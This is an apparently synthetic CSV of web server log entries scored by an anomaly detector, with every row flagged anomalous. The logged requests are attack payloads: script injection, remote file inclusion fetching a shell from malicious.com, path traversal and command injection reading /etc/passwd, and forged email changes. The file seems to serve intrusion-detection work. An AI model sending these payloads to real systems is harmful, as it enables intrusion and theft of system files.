ip,timestamp,request,status,size,size_zscore,size_anomaly,request_length,status_code,iso_forest,is_anomaly
240.120.7.195,2025-03-15 12:17:28,POST /change-email?email=attacker@example.com HTTP/1.1,200,744,-1.5342461935658338,False,54,200,True,True
90.242.28.116,2025-03-15 12:17:31,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3815,0.823735774719421,False,60,200,True,True
30.48.53.51,2025-03-15 12:17:15,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4958,1.7013565463736204,False,59,200,True,True
124.228.149.107,2025-03-15 12:17:28,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,748,-1.531174904776143,False,60,200,True,True
220.122.146.13,2025-03-15 12:17:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1817,-0.7103729757312267,False,60,200,True,True
98.141.235.72,2025-03-15 12:17:30,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3166,0.3254191685920585,False,60,200,True,True
55.177.3.216,2025-03-15 12:17:00,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4412,1.2821256265808008,False,60,200,True,True
208.214.70.185,2025-03-15 12:17:03,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4944,1.690607035609702,False,47,403,True,True
45.169.20.25,2025-03-15 12:17:11,POST /change-email?email=attacker@example.com HTTP/1.1,200,1035,-1.3108099341158146,False,54,200,True,True
237.29.84.118,2025-03-15 12:17:25,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3986,0.9550333704787107,False,60,200,True,True
95.150.186.141,2025-03-15 12:17:48,POST /change-email?email=attacker@example.com HTTP/1.1,200,4634,1.4525821544086506,False,54,200,True,True
218.147.251.21,2025-03-15 12:17:01,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4795,1.5762015281937127,False,47,403,True,True
140.213.203.133,2025-03-15 12:17:39,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4508,1.3558365575333846,False,60,200,True,True
148.222.203.223,2025-03-15 12:17:43,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,946,-1.379146109686439,False,51,403,True,True
10.73.248.213,2025-03-15 12:17:33,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,756,-1.525032327196761,False,60,200,True,True
103.41.41.94,2025-03-15 12:18:00,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,508,-1.715452232157602,False,51,403,True,True
163.130.181.195,2025-03-15 12:17:39,POST /change-email?email=attacker@example.com HTTP/1.1,200,4048,1.002638346718921,False,54,200,True,True
156.2.70.197,2025-03-15 12:17:45,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,618,-1.6309917904411,False,59,200,True,True
33.199.8.240,2025-03-15 12:17:51,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,656,-1.6018145469390357,False,47,403,True,True
24.52.202.185,2025-03-15 12:17:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4742,1.5355069517303073,False,60,200,True,True
101.11.198.171,2025-03-15 12:17:24,POST /change-email?email=attacker@example.com HTTP/1.1,200,854,-1.4497857518493318,False,54,200,True,True
95.0.185.104,2025-03-15 12:17:16,POST /change-email?email=attacker@example.com HTTP/1.1,200,584,-1.6570977451534734,False,54,200,True,True
40.138.178.115,2025-03-15 12:18:00,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3382,0.4912687632353718,False,60,200,True,True
196.170.55.101,2025-03-15 12:17:11,POST /change-email?email=attacker@example.com HTTP/1.1,200,3921,0.9051249276462322,False,54,200,True,True
250.23.106.165,2025-03-15 12:18:02,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,611,-1.6363665458230592,False,47,403,True,True
65.163.81.242,2025-03-15 12:17:13,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1866,-0.6727496880575121,False,60,200,True,True
130.104.204.187,2025-03-15 12:17:29,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,879,-1.430590196913763,False,51,403,True,True
137.248.250.217,2025-03-15 12:17:10,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4489,1.3412479357823524,False,59,200,True,True
107.31.187.245,2025-03-15 12:17:42,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,515,-1.7100774767756428,False,59,200,True,True
196.168.66.215,2025-03-15 12:18:04,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4501,1.3504618021514252,False,51,403,True,True
48.106.207.6,2025-03-15 12:17:39,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1673,-0.8209393721601023,False,60,200,True,True
82.159.53.212,2025-03-15 12:18:01,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1191,-1.191029671317866,False,60,200,True,True
38.72.29.109,2025-03-15 12:17:38,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4977,1.7159451681246527,False,51,403,True,True
117.70.106.176,2025-03-15 12:17:50,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4334,1.2222354951818266,False,47,403,True,True
134.35.14.93,2025-03-15 12:18:04,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4559,1.3949954896019445,False,47,403,True,True
79.61.209.62,2025-03-15 12:17:24,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,988,-1.3468975773946836,False,59,200,True,True
179.221.107.211,2025-03-15 12:18:02,POST /change-email?email=attacker@example.com HTTP/1.1,200,4191,1.1124369209503737,False,54,200,True,True
179.175.79.124,2025-03-15 12:17:34,POST /change-email?email=attacker@example.com HTTP/1.1,200,514,-1.7108452989730656,False,54,200,True,True
57.30.4.137,2025-03-15 12:17:51,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,641,-1.6133318799003769,False,47,403,True,True
170.198.245.135,2025-03-15 12:17:41,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,515,-1.7100774767756428,False,60,200,True,True
189.69.63.90,2025-03-15 12:18:08,POST /change-email?email=attacker@example.com HTTP/1.1,200,4062,1.0133878574828394,False,54,200,True,True
80.213.144.187,2025-03-15 12:18:04,POST /change-email?email=attacker@example.com HTTP/1.1,200,4872,1.6353238373952643,False,54,200,True,True
7.23.85.202,2025-03-15 12:18:08,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,905,-1.4106268197807716,False,59,200,True,True
59.129.188.194,2025-03-15 12:17:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1468,-0.9783429226317654,False,60,200,True,True
103.181.112.207,2025-03-15 12:18:11,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,537,-1.6931853884323425,False,59,200,True,True
45.237.52.157,2025-03-15 12:17:57,POST /change-email?email=attacker@example.com HTTP/1.1,200,552,-1.6816680554710013,False,54,200,True,True
201.166.214.228,2025-03-15 12:17:48,POST /change-email?email=attacker@example.com HTTP/1.1,200,926,-1.394502553634894,False,54,200,True,True
48.65.124.247,2025-03-15 12:17:53,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3424,0.5235172955271271,False,60,200,True,True
104.207.92.23,2025-03-15 12:17:21,POST /change-email?email=attacker@example.com HTTP/1.1,200,4123,1.060225011525627,False,54,200,True,True
122.134.5.98,2025-03-15 12:17:21,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,870,-1.4375005966905678,False,60,200,True,True
179.16.205.23,2025-03-15 12:17:30,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1468,-0.9783429226317654,False,60,200,True,True
35.180.129.22,2025-03-15 12:17:24,POST /change-email?email=attacker@example.com HTTP/1.1,200,924,-1.3960381980297394,False,54,200,True,True
52.88.216.168,2025-03-15 12:17:29,POST /change-email?email=attacker@example.com HTTP/1.1,200,757,-1.5242645049993382,False,54,200,True,True
119.134.20.51,2025-03-15 12:17:41,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,653,-1.6041180135313038,False,47,403,True,True
248.104.95.221,2025-03-15 12:18:10,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3499,0.5811039603338332,False,60,200,True,True
254.15.74.178,2025-03-15 12:17:21,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4735,1.530132196348348,False,59,200,True,True
56.59.152.173,2025-03-15 12:17:40,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,813,-1.4812664619436644,False,60,200,True,True
254.184.70.41,2025-03-15 12:17:58,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,736,-1.5403887711452158,False,59,200,True,True
55.249.104.36,2025-03-15 12:17:53,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1032,-1.313113400708083,False,59,200,True,True
18.47.141.98,2025-03-15 12:17:46,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,533,-1.6962566772220333,False,59,200,True,True
197.169.214.196,2025-03-15 12:18:07,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4849,1.6176639268545412,False,59,200,True,True
104.210.215.9,2025-03-15 12:17:34,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4697,1.5009549528462836,False,59,200,True,True
120.33.221.241,2025-03-15 12:17:38,POST /change-email?email=attacker@example.com HTTP/1.1,200,4851,1.6191995712493865,False,54,200,True,True
85.210.25.189,2025-03-15 12:17:49,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4495,1.3458548689668888,False,47,403,True,True
15.114.195.79,2025-03-15 12:17:50,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,826,-1.4712847733771686,False,51,403,True,True
39.232.238.27,2025-03-15 12:17:53,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4870,1.6337881930004188,False,47,403,True,True
35.226.236.67,2025-03-15 12:18:09,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,566,-1.670918544707083,False,47,403,True,True
209.27.178.158,2025-03-15 12:17:50,POST /change-email?email=attacker@example.com HTTP/1.1,200,1005,-1.333844600038497,False,54,200,True,True
212.164.94.54,2025-03-15 12:17:26,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,779,-1.5073724166560378,False,51,403,True,True
169.170.17.85,2025-03-15 12:17:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4703,1.5055618860308202,False,60,200,True,True
185.101.93.68,2025-03-15 12:18:19,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1701,-0.7994403506322654,False,60,200,True,True
88.87.80.196,2025-03-15 12:17:27,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4594,1.4218692665117407,False,47,403,True,True
90.88.56.170,2025-03-15 12:17:36,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4762,1.550863395678762,False,47,403,True,True
109.63.105.78,2025-03-15 12:17:29,POST /change-email?email=attacker@example.com HTTP/1.1,200,519,-1.707006187985952,False,54,200,True,True
49.0.235.69,2025-03-15 12:18:13,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4412,1.2821256265808008,False,47,403,True,True
154.3.64.120,2025-03-15 12:18:09,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1696,-0.803279461619379,False,60,200,True,True
93.224.32.178,2025-03-15 12:18:14,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4508,1.3558365575333846,False,51,403,True,True
48.207.230.158,2025-03-15 12:17:42,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4929,1.6790897026483609,False,59,200,True,True
151.34.189.111,2025-03-15 12:18:22,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4420,1.2882682041601827,False,47,403,True,True
53.231.190.153,2025-03-15 12:17:36,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4765,1.5531668622710304,False,47,403,True,True
239.61.249.207,2025-03-15 12:17:28,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4602,1.4280118440911227,False,60,200,True,True
105.71.20.9,2025-03-15 12:17:25,POST /change-email?email=attacker@example.com HTTP/1.1,200,796,-1.4943194392998511,False,54,200,True,True
112.81.187.84,2025-03-15 12:18:16,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2999,0.1971928616224598,False,60,200,True,True
18.43.246.183,2025-03-15 12:17:42,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1195,-1.1879583825281752,False,51,403,True,True
236.167.195.171,2025-03-15 12:18:24,POST /change-email?email=attacker@example.com HTTP/1.1,200,4187,1.1093656321606828,False,54,200,True,True
164.154.237.92,2025-03-15 12:18:14,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,896,-1.4175372195575764,False,51,403,True,True
187.213.48.162,2025-03-15 12:18:06,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4631,1.4502786878163823,False,59,200,True,True
243.80.6.154,2025-03-15 12:18:21,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,864,-1.4421075298751043,False,60,200,True,True
79.235.167.198,2025-03-15 12:18:09,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4340,1.226842428366363,False,59,200,True,True
1.201.33.236,2025-03-15 12:17:34,POST /change-email?email=attacker@example.com HTTP/1.1,200,4742,1.5355069517303073,False,54,200,True,True
98.141.69.14,2025-03-15 12:17:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1543,-0.9207562578250593,False,60,200,True,True
124.235.144.30,2025-03-15 12:17:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3408,0.5112321403683632,False,60,200,True,True
181.251.25.112,2025-03-15 12:18:14,POST /change-email?email=attacker@example.com HTTP/1.1,200,1048,-1.300828245549319,False,54,200,True,True
169.127.108.98,2025-03-15 12:17:56,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,649,-1.6071893023209949,False,60,200,True,True
159.146.10.46,2025-03-15 12:18:21,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4718,1.5170792189921614,False,51,403,True,True
82.74.162.88,2025-03-15 12:18:10,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,884,-1.4267510859266495,False,51,403,True,True
56.230.117.174,2025-03-15 12:17:39,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1207,-1.1787445161591021,False,51,403,True,True
63.11.75.172,2025-03-15 12:18:11,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4948,1.6936783243993931,False,51,403,True,True
183.27.34.173,2025-03-15 12:18:05,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4720,1.518614863387007,False,51,403,True,True
202.126.89.200,2025-03-15 12:17:56,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4519,1.3642826017050347,False,59,200,True,True
84.153.63.9,2025-03-15 12:18:25,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1390,-1.0382330540307396,False,60,200,True,True
182.220.157.149,2025-03-15 12:18:13,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4925,1.6760184138586698,False,60,200,True,True
238.169.84.186,2025-03-15 12:18:18,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,824,-1.4728204177720141,False,60,200,True,True
166.126.146.223,2025-03-15 12:04:33,GET /admin HTTP/1.1,403,610,-1.637134368020482,False,19,403,True,True
197.122.54.14,2025-03-15 12:04:39,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4760,1.5493277512839168,False,47,403,True,True
88.188.178.34,2025-03-15 12:04:50,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3486,0.5711222717673374,False,60,403,True,True
73.123.246.17,2025-03-15 12:05:24,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4925,1.6760184138586698,False,60,403,True,True
62.39.106.26,2025-03-15 12:05:27,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,981,-1.3522723327766428,False,51,403,True,True
84.217.57.229,2025-03-15 12:05:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4252,1.1592740749931614,False,60,403,True,True
218.15.249.155,2025-03-15 12:05:23,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4840,1.6107535270777364,False,59,200,True,True
37.93.7.152,2025-03-15 12:05:03,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3987,0.9558011926761335,False,60,403,True,True
251.14.32.140,2025-03-15 12:04:52,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2224,-0.39786934138016883,False,60,403,True,True
23.226.186.252,2025-03-15 12:05:31,GET /admin HTTP/1.1,403,599,-1.6455804121921322,False,19,403,True,True
8.197.63.245,2025-03-15 12:05:12,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,621,-1.6286883238488317,False,47,403,True,True
168.52.227.142,2025-03-15 12:04:59,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,669,-1.5918328583725398,False,47,403,True,True
27.14.4.239,2025-03-15 12:05:29,POST /change-email?email=attacker@example.com HTTP/1.1,200,4690,1.4955801974643244,False,54,200,True,True
252.186.60.233,2025-03-15 12:05:13,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4466,1.3235880252416292,False,51,403,True,True
98.54.162.129,2025-03-15 12:05:23,GET /admin HTTP/1.1,403,4605,1.430315310683391,False,19,403,True,True
182.155.33.239,2025-03-15 12:05:24,POST /change-email?email=attacker@example.com HTTP/1.1,200,1046,-1.3023638899441643,False,54,200,True,True
187.240.199.79,2025-03-15 12:05:30,POST /change-email?email=attacker@example.com HTTP/1.1,200,574,-1.664775967127701,False,54,200,True,True
130.197.23.11,2025-03-15 12:04:48,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1112,-1.2516876249142632,False,60,403,True,True
31.69.219.253,2025-03-15 12:04:57,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4477,1.3320340694132793,False,47,403,True,True
23.174.156.220,2025-03-15 12:05:05,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2693,-0.037760730788900666,False,60,403,True,True
105.163.107.37,2025-03-15 12:05:03,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,835,-1.464374373600364,False,51,403,True,True
98.76.31.34,2025-03-15 12:04:52,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,919,-1.3998773090168533,False,60,403,True,True
124.20.14.207,2025-03-15 12:05:02,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,753,-1.527335793789029,False,47,403,True,True
68.58.220.101,2025-03-15 12:05:04,GET /admin HTTP/1.1,403,4561,1.39653113399679,False,19,403,True,True
65.180.57.124,2025-03-15 12:05:10,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3902,0.8905363058952,False,60,403,True,True
86.149.230.209,2025-03-15 12:05:20,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4487,1.3397122913875068,False,47,403,True,True
220.30.240.190,2025-03-15 12:05:04,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2881,0.1065898423265757,False,60,403,True,True
240.26.0.15,2025-03-15 12:05:36,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4169,1.0955448326070734,False,60,403,True,True
105.181.66.177,2025-03-15 12:05:20,GET /execute?cmd=whoami HTTP/1.1,403,581,-1.6594012117457415,False,32,403,True,True
75.74.35.112,2025-03-15 12:05:02,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2882,0.10735766452399845,False,60,403,True,True
211.247.131.134,2025-03-15 12:04:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4444,1.3066959368983286,False,60,403,True,True
218.162.37.66,2025-03-15 12:11:48,POST /wp-json/wp/v2/users HTTP/1.1,403,589,-1.6532586341663595,False,34,403,True,True
136.81.211.129,2025-03-15 12:11:59,POST /change-email?email=attacker@example.com HTTP/1.1,200,1008,-1.3315411334462288,False,54,200,True,True
39.25.140.224,2025-03-15 12:11:36,POST /change-email?email=attacker@example.com HTTP/1.1,200,4147,1.078652744263773,False,54,200,True,True
105.33.193.204,2025-03-15 12:11:52,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3735,0.7623099989256014,False,60,200,True,True
134.217.42.221,2025-03-15 12:12:13,POST /change-email?email=attacker@example.com HTTP/1.1,200,3934,0.9151066162127279,False,54,200,True,True
90.197.58.216,2025-03-15 12:12:27,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4898,1.6552872145282558,False,47,403,True,True
250.146.81.54,2025-03-15 12:11:34,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4043,0.9987992357318073,False,60,200,True,True
236.52.235.69,2025-03-15 12:11:33,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2988,0.1887468174508096,False,60,200,True,True
143.86.105.76,2025-03-15 12:12:04,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1433,-1.0052166995415615,False,60,200,True,True
172.171.42.208,2025-03-15 12:12:04,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,537,-1.6931853884323425,False,60,200,True,True
218.173.209.25,2025-03-15 12:12:23,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4916,1.669108014081865,False,51,403,True,True
157.210.19.231,2025-03-15 12:12:24,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4809,1.5869510389576313,False,60,200,True,True
182.145.177.200,2025-03-15 12:12:10,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1043,-1.3046673565364326,False,51,403,True,True
84.154.22.39,2025-03-15 12:11:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3853,0.8529130182214855,False,60,200,True,True
24.37.163.166,2025-03-15 12:12:35,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4952,1.696749613189084,False,59,200,True,True
220.103.158.8,2025-03-15 12:11:44,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4991,1.726694678888571,False,60,200,True,True
194.103.128.121,2025-03-15 12:12:03,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,965,-1.364557487935407,False,51,403,True,True
180.182.185.142,2025-03-15 12:12:27,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,679,-1.5841546363983123,False,47,403,True,True
76.238.56.139,2025-03-15 12:12:05,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1133,-1.2355633587683854,False,60,200,True,True
254.187.221.184,2025-03-15 12:12:23,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4950,1.6952139687942385,False,59,200,True,True
216.115.115.99,2025-03-15 12:11:54,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1637,-0.8485809712673211,False,60,200,True,True
10.77.16.120,2025-03-15 12:12:15,POST /change-email?email=attacker@example.com HTTP/1.1,200,675,-1.5872259251880034,False,54,200,True,True
94.81.79.193,2025-03-15 12:12:36,POST /upload-xml HTTP/1.1,403,642,-1.612564057702954,False,25,403,True,True
43.200.41.42,2025-03-15 12:12:00,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,752,-1.5281036159864518,False,59,200,True,True
187.28.136.126,2025-03-15 12:12:06,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4196,1.1162760319374876,False,60,200,True,True
183.17.90.214,2025-03-15 12:12:10,GET /admin HTTP/1.1,403,4692,1.49711584185917,False,19,403,True,True
213.165.78.175,2025-03-15 12:12:30,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4319,1.2107181622204854,False,51,403,True,True
196.172.180.193,2025-03-15 12:12:09,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,506,-1.7169878765524476,False,60,200,True,True
251.208.104.216,2025-03-15 12:12:29,GET /admin HTTP/1.1,403,4526,1.3696573570869939,False,19,403,True,True
250.219.202.98,2025-03-15 12:12:25,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3961,0.935837815543142,False,60,200,True,True
145.166.229.249,2025-03-15 12:12:31,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1283,-1.1203900291549735,False,60,200,True,True
176.29.212.84,2025-03-15 12:12:13,POST /upload-xml HTTP/1.1,403,4973,1.7128738793349616,False,25,403,True,True
234.191.151.232,2025-03-15 12:12:45,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1463,-0.982182033618879,False,60,200,True,True
211.239.122.58,2025-03-15 12:12:29,POST /change-email?email=attacker@example.com HTTP/1.1,200,4266,1.1700235857570798,False,54,200,True,True
11.27.156.107,2025-03-15 12:12:34,POST /change-email?email=attacker@example.com HTTP/1.1,200,674,-1.5879937473854262,False,54,200,True,True
108.222.211.242,2025-03-15 12:12:40,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4683,1.4902054420823652,False,47,403,True,True
26.93.125.68,2025-03-15 12:12:12,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4950,1.6952139687942385,False,60,200,True,True
114.36.176.60,2025-03-15 12:11:57,GET /admin HTTP/1.1,403,4611,1.4349222438679274,False,19,403,True,True
49.191.230.173,2025-03-15 12:11:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4945,1.6913748578071248,False,60,200,True,True
55.190.118.138,2025-03-15 12:11:57,GET /admin HTTP/1.1,403,4526,1.3696573570869939,False,19,403,True,True
101.22.206.76,2025-03-15 12:12:01,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4431,1.296714248331833,False,59,200,True,True
82.73.151.25,2025-03-15 12:12:47,POST /change-email?email=attacker@example.com HTTP/1.1,200,3958,0.9335343489508738,False,54,200,True,True
242.1.187.244,2025-03-15 12:11:58,POST /change-email?email=attacker@example.com HTTP/1.1,200,4979,1.7174808125194982,False,54,200,True,True
182.66.168.59,2025-03-15 12:12:01,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,941,-1.382985220673553,False,51,403,True,True
206.121.229.30,2025-03-15 12:12:30,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,875,-1.433661485703454,False,51,403,True,True
81.19.49.210,2025-03-15 12:12:02,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4836,1.6076822382880454,False,59,200,True,True
162.253.202.3,2025-03-15 12:12:23,GET /execute?cmd=whoami HTTP/1.1,403,4965,1.7067313017555796,False,32,403,True,True
179.240.240.127,2025-03-15 12:11:56,POST /upload-xml HTTP/1.1,403,644,-1.6110284133081085,False,25,403,True,True
202.142.105.84,2025-03-15 12:12:46,POST /change-email?email=attacker@example.com HTTP/1.1,200,4734,1.5293643741509253,False,54,200,True,True
112.205.211.162,2025-03-15 12:12:22,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1019,-1.3230950892745785,False,59,200,True,True
223.85.178.166,2025-03-15 12:12:19,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4957,1.7005887241761977,False,60,200,True,True
164.192.129.150,2025-03-15 12:11:58,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4940,1.687535746820011,False,51,403,True,True
108.176.232.91,2025-03-15 12:12:44,POST /change-email?email=attacker@example.com HTTP/1.1,200,4018,0.9796036807962386,False,54,200,True,True
100.134.89.74,2025-03-15 12:12:11,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,778,-1.5081402388534606,False,60,200,True,True
